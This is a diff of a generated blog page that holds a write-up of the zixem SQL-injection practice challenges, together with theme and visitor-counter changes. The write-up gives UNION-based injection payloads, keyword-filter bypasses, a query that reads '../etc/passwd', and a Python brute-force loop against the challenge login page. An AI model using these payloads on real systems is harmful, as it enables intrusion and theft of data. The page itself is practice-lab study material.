@@ -295,9 +295,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="l_cover">
   
     
-        <div id="full" class='cover-wrapper post dock' style="display: none;">
+        <div id="full" class='cover-wrapper post focus' style="display: none;">
           
-            <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/056.jpg"></div>
+            <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg"></div>
           
           <div class='cover-body'>
   <div class='top'>
@@ -347,7 +347,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
 <div class='new-meta-item author'>
   <a class='author' href="/" rel="nofollow">
-    <img no-lazy src="">
+    <img no-lazy src="/img/header/cat.jpeg">
     <p>jhyeon</p>
   </a>
 </div>
@@ -370,7 +370,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>Apr 10, 2020</p>
+    <p>Date : Apr 10, 2020</p>
   </a>
 </div>
 
@@ -378,6 +378,17 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         
           
             
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="zixem challenge Write up" data-path="/2020/04/10/zixemchall-200410/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        View
+      </div>
+    </a>
+  </div>
+
 
           
         
@@ -390,34 +401,23 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
   <p>Site : <a target="_blank" rel="noopener" href="https://www.zixem.altervista.org/SQLi/">https://www.zixem.altervista.org/SQLi/</a></p>
 <hr>
-<h3 id="1-LEVEL-1"><a href="#1-LEVEL-1" class="headerlink" title="1. LEVEL-1"></a>1. LEVEL-1</h3><pre><code class="sql">id=0%20union%20select%201,version(),3;--%20-</code></pre>
+<h3 id="1-LEVEL-1"><a href="#1-LEVEL-1" class="headerlink" title="1. LEVEL-1"></a>1. LEVEL-1</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">union</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">201</span>,version(),<span class="hljs-number">3</span>;<span class="hljs-comment">--%20-</span><br></code></pre></td></tr></table></figure>
 <hr>
-<h3 id="2-LEVEL-2"><a href="#2-LEVEL-2" class="headerlink" title="2. LEVEL-2"></a>2. LEVEL-2</h3><pre><code class="sql">showprofile=0%27%20union%20select%201,2,version(),4;--%20-</code></pre>
+<h3 id="2-LEVEL-2"><a href="#2-LEVEL-2" class="headerlink" title="2. LEVEL-2"></a>2. LEVEL-2</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">showprofile<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">union</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">201</span>,<span class="hljs-number">2</span>,version(),<span class="hljs-number">4</span>;<span class="hljs-comment">--%20-</span><br></code></pre></td></tr></table></figure>
 <hr>
-<h3 id="3-LEVEL-3"><a href="#3-LEVEL-3" class="headerlink" title="3. LEVEL-3"></a>3. LEVEL-3</h3><pre><code class="sql">item=0%27%20unionon%20select%201,2,version(),4;--%20-</code></pre>
+<h3 id="3-LEVEL-3"><a href="#3-LEVEL-3" class="headerlink" title="3. LEVEL-3"></a>3. LEVEL-3</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">item<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>unionon<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">201</span>,<span class="hljs-number">2</span>,version(),<span class="hljs-number">4</span>;<span class="hljs-comment">--%20-</span><br></code></pre></td></tr></table></figure>
 <hr>
-<h3 id="4-LEVEL-4"><a href="#4-LEVEL-4" class="headerlink" title="4. LEVEL-4"></a>4. LEVEL-4</h3><pre><code class="sql">ebookid=0%27%20union%20select%201,2,3,version(),5;--%20-</code></pre>
+<h3 id="4-LEVEL-4"><a href="#4-LEVEL-4" class="headerlink" title="4. LEVEL-4"></a>4. LEVEL-4</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">ebookid<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">union</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,version(),<span class="hljs-number">5</span>;<span class="hljs-comment">--%20-</span><br></code></pre></td></tr></table></figure>
 <hr>
-<h3 id="5-LEVEL-5"><a href="#5-LEVEL-5" class="headerlink" title="5. LEVEL-5"></a>5. LEVEL-5</h3><pre><code class="py">#!/usr/bin/python
-
-import requests
-
-for i in range(0,2000):
-param = &quot;http://www.zixem.altervista.org/SQLi/login_do.php?pass=&quot;+str(i)
-r = requests.get(param)
-print param
-
-if &quot;Brute Force&quot; in r.text:
-    print &quot;found key: &quot; + str(i)
-    break</code></pre>
+<h3 id="5-LEVEL-5"><a href="#5-LEVEL-5" class="headerlink" title="5. LEVEL-5"></a>5. LEVEL-5</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python</span><br><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2000</span>):<br>param = <span class="hljs-string">&quot;http://www.zixem.altervista.org/SQLi/login_do.php?pass=&quot;</span>+<span class="hljs-built_in">str</span>(i)<br>r = requests.get(param)<br><span class="hljs-built_in">print</span> param<br><br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Brute Force&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;found key: &quot;</span> + <span class="hljs-built_in">str</span>(i)<br>    <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
 <hr>
-<h3 id="6-LEVEL-6"><a href="#6-LEVEL-6" class="headerlink" title="6. LEVEL-6"></a>6. LEVEL-6</h3><pre><code class="sql">serial=0%20and%201=1%20union%20select%20id,teacher,teacher_age,price%20from%20teachers%20%20where%20id=11%23</code></pre>
+<h3 id="6-LEVEL-6"><a href="#6-LEVEL-6" class="headerlink" title="6. LEVEL-6"></a>6. LEVEL-6</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">serial<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">and</span><span class="hljs-operator">%</span><span class="hljs-number">201</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">union</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>id,teacher,teacher_age,price<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">from</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>teachers<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">where</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>id<span class="hljs-operator">=</span><span class="hljs-number">11</span><span class="hljs-operator">%</span><span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>
 <hr>
-<h3 id="7-LEVEL-7"><a href="#7-LEVEL-7" class="headerlink" title="7. LEVEL-7"></a>7. LEVEL-7</h3><pre><code class="sql">id=0%20union%20select%201,version(),3;--%20-</code></pre>
+<h3 id="7-LEVEL-7"><a href="#7-LEVEL-7" class="headerlink" title="7. LEVEL-7"></a>7. LEVEL-7</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">union</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">201</span>,version(),<span class="hljs-number">3</span>;<span class="hljs-comment">--%20-</span><br></code></pre></td></tr></table></figure>
 <hr>
-<h3 id="8-LEVEL-8"><a href="#8-LEVEL-8" class="headerlink" title="8. LEVEL-8"></a>8. LEVEL-8</h3><pre><code class="sql">id=0%09union%09seselectlect%091,version(),3;--%09-</code></pre>
+<h3 id="8-LEVEL-8"><a href="#8-LEVEL-8" class="headerlink" title="8. LEVEL-8"></a>8. LEVEL-8</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">%</span><span class="hljs-number">09</span><span class="hljs-keyword">union</span><span class="hljs-operator">%</span><span class="hljs-number">09</span>seselectlect<span class="hljs-operator">%</span><span class="hljs-number">091</span>,version(),<span class="hljs-number">3</span>;<span class="hljs-comment">--%09-</span><br></code></pre></td></tr></table></figure>
 <hr>
-<h3 id="9-LEVEL-9"><a href="#9-LEVEL-9" class="headerlink" title="9. LEVEL-9"></a>9. LEVEL-9</h3><pre><code class="sql">0%27%20union%20select%20&quot;../etc/passwd&quot;,2;--%20-</code></pre>
+<h3 id="9-LEVEL-9"><a href="#9-LEVEL-9" class="headerlink" title="9. LEVEL-9"></a>9. LEVEL-9</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">0</span><span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">union</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>&quot;../etc/passwd&quot;,<span class="hljs-number">2</span>;<span class="hljs-comment">--%20-</span><br></code></pre></td></tr></table></figure>
 <hr>
 <h3 id="10-LEVEL-10"><a href="#10-LEVEL-10" class="headerlink" title="10. LEVEL-10"></a>10. LEVEL-10</h3><ul>
 <li>php uuencode -&gt; base64 encode</li>
@@ -451,10 +451,10 @@ if &quot;Brute Force&quot; in r.text:
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-04-10T00:00:00+09:00">
+          <div class="new-meta-item date">
   <a class='notlink'>
-    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>EditApr 10, 2020</p>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>Date : Apr 10, 2020</p>
   </a>
 </div>
 
@@ -482,16 +482,13 @@ if &quot;Brute Force&quot; in r.text:
       
         <a class='prev' href='/2020/04/10/zer0ptsctf-200410/'>
           <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>zer0pts 2020 Write up</p>
-          <p class='content'>1. [web] can you guess it?(338 pt)&lt;?php
-include &#39;config.php&#39;; // FLAG is defined in co...</p>
+          <p class='content'>1. [web] can you guess it?(338 pt)12345678910111213141516171819202122&lt;?phpinclude &#x27;config...</p>
         </a>
       
       
         <a class='next' href='/2020/02/23/trustctf-200223/'>
           <p class='title'>TRUST CTF 2019 Write up<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>1. (web) ezrc&lt;?php session_start(); include &#39;config.php&#39;; ?&gt;
-&lt;?php
-    if(!isset...</p>
+          <p class='content'>1. (web) ezrc123456789101112131415161718192021222324252627282930313233343536373839404142434445464...</p>
         </a>
       
     </div>
@@ -536,7 +533,7 @@ include &#39;config.php&#39;; // FLAG is defined in co...</p>
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-LEVEL-1"><span class="toc-text">1. LEVEL-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-LEVEL-2"><span class="toc-text">2. LEVEL-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-LEVEL-3"><span class="toc-text">3. LEVEL-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-LEVEL-4"><span class="toc-text">4. LEVEL-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-LEVEL-5"><span class="toc-text">5. LEVEL-5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-LEVEL-6"><span class="toc-text">6. LEVEL-6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-LEVEL-7"><span class="toc-text">7. LEVEL-7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-LEVEL-8"><span class="toc-text">8. LEVEL-8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-LEVEL-9"><span class="toc-text">9. LEVEL-9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-LEVEL-10"><span class="toc-text">10. LEVEL-10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ALL-CLEAR"><span class="toc-text">ALL CLEAR</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-LEVEL-1"><span class="toc-number">1.</span> <span class="toc-text">1. LEVEL-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-LEVEL-2"><span class="toc-number">2.</span> <span class="toc-text">2. LEVEL-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-LEVEL-3"><span class="toc-number">3.</span> <span class="toc-text">3. LEVEL-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-LEVEL-4"><span class="toc-number">4.</span> <span class="toc-text">4. LEVEL-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-LEVEL-5"><span class="toc-number">5.</span> <span class="toc-text">5. LEVEL-5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-LEVEL-6"><span class="toc-number">6.</span> <span class="toc-text">6. LEVEL-6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-LEVEL-7"><span class="toc-number">7.</span> <span class="toc-text">7. LEVEL-7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-LEVEL-8"><span class="toc-number">8.</span> <span class="toc-text">8. LEVEL-8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-LEVEL-9"><span class="toc-number">9.</span> <span class="toc-text">9. LEVEL-9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-LEVEL-10"><span class="toc-number">10.</span> <span class="toc-text">10. LEVEL-10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ALL-CLEAR"><span class="toc-number">11.</span> <span class="toc-text">ALL CLEAR</span></a></li></ol>
     </div>
   </section>
 
@@ -706,7 +703,7 @@ var loadCSS = function( href, before, media, attributes ){
   loadCSS("https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css", window.volantis.loadcss);
   
   
-  loadCSS("https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/styles/solarized-light.min.css", window.volantis.loadcss);
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@10.5.0/styles/atelier-cave-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1099,6 +1096,215 @@ volantis.pjax.push(()=>{
 
 
 
+  <script defer>
+
+  const LCCounter = {
+    app_id: 'u9j57bwJod4EDmXWdxrwuqQT-MdYXbMMI',
+    app_key: 'jfHtEKVE24j0IVCGHbvuFClp',
+    custom_api_server: '',
+
+    // 查询存储的记录
+    getRecord(Counter, url, title) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({url})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {url, title: title, times: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    },
+
+    // 发起自增请求
+    increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    },
+
+    // 构建自增请求体
+    buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "times": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    },
+
+    // 校验是否为有效的 UV
+    validUV() {
+      var key = 'LeanCloudUVTimestamp';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    },
+
+    addCount(Counter) {
+      var enableIncr = '' === 'true' && window.location.hostname !== 'localhost';
+      enableIncr = true;
+      var getterArr = [];
+      var incrArr = [];
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#lc-sv');
+      if (pvCtn || enableIncr) {
+        var pvGetter = this.getRecord(Counter, 'https://blog.jhyeon.dev' + '/#lc-sv', 'Visits').then((record) => {
+          incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-sv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + 1;
+              if (pvCtn) {
+                pvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#lc-uv');
+      if (uvCtn || enableIncr) {
+        var uvGetter = this.getRecord(Counter, 'https://blog.jhyeon.dev' + '/#lc-uv', 'Visitors').then((record) => {
+          var vuv = this.validUV();
+          vuv && incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-uv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + (vuv ? 1 : 0);
+              if (uvCtn) {
+                uvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 请求文章的浏览数，如果是当前页面就自增
+      var allPV = document.querySelectorAll('#lc-pv');
+      if (allPV.length > 0 || enableIncr) {
+        for (i = 0; i < allPV.length; i++) {
+          let pv = allPV[i];
+          let title = pv.getAttribute('data-title');
+          var url = 'https://blog.jhyeon.dev' + pv.getAttribute('data-path');
+          if (url) {
+            var viewGetter = this.getRecord(Counter, url, title).then((record) => {
+              // 是当前页面就自增
+              let curPath = window.location.pathname;
+              if (curPath.includes('index.html')) {
+                curPath = curPath.substring(0, curPath.lastIndexOf('index.html'));
+              }
+              if (pv.getAttribute('data-path') == curPath) {
+                incrArr.push(this.buildIncrement(record.objectId));
+              }
+              if (pv) {
+                var ele = pv.querySelector('#lc-pv #number');
+                if (ele) {
+                  if (pv.getAttribute('data-path') == curPath) {
+                    ele.innerText = (record.times || 0) + 1;
+                  } else {
+                    ele.innerText = record.times || 0;
+                  }
+                  pv.style.display = 'inline';
+                }
+              }
+            });
+            getterArr.push(viewGetter);
+          }
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && this.increment(Counter, incrArr);
+        })
+      }
+
+    },
+
+
+    fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': this.app_id,
+            'X-LC-Key': this.app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      this.addCount(Counter);
+    },
+
+    refreshCounter() {
+      var api_server = this.app_id.slice(-9) !== '-MdYXbMMI' ? this.custom_api_server : `https://${ this.app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+      if (api_server) {
+        this.fetchData(api_server);
+      } else {
+        fetch('https://app-router.leancloud.cn/2/route?appId=' + this.app_id)
+          .then(resp => resp.json())
+          .then(({api_server}) => {
+            this.fetchData('https://' + api_server);
+          });
+      }
+    }
+
+  };
+
+  LCCounter.refreshCounter();
+
+  document.addEventListener('pjax:complete', function () {
+    LCCounter.refreshCounter();
+  });
+</script>
+
+
 
 
 
@@ -1120,8 +1326,6 @@ function listennSidebarTOC() {
       event.preventDefault();
       window.scrollTo({
 		top: target.offsetTop + 100,
-		
-		behavior: "smooth"
 		
 	  });
     });
